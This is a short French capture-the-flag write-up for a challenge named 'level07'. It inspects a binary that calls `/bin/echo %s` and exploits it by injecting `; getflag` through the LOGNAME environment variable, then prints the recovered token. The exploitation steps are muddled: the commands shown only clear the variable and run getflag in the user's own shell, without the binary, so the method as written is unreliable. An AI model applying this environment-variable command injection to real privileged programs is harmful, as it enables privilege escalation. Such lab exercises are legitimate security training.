# level07

1. Fichiers trouvés dans `~/` :

```bash
./level07
```

2) Analyse du binaire :

```bash
strings level07
```

Une ligne retient notre attention :

```bash
/bin/echo %s 
```

Le script affiche donc une variable qui se nomme `level07`. Nous allons grep toutes les variables d'environnement qui se nomment `level07`, et deux sont retenues :

```bash
USER=level07
LOGNAME=level07
```

3) Exploitation : renommer `LOGNAME` pour échapper `echo` et chaîner `getflag`.

```bash
LOGNAME=; getflag
```

4) Exécution : lancer `./level07` afin d'exécuter la commande `echo` prévue, puis `; getflag`.

```bash
echo $LOGNAME; getflag
```

5) Token découvert :

Le token est `fiumuikeil55xe9cu4dood66h`.
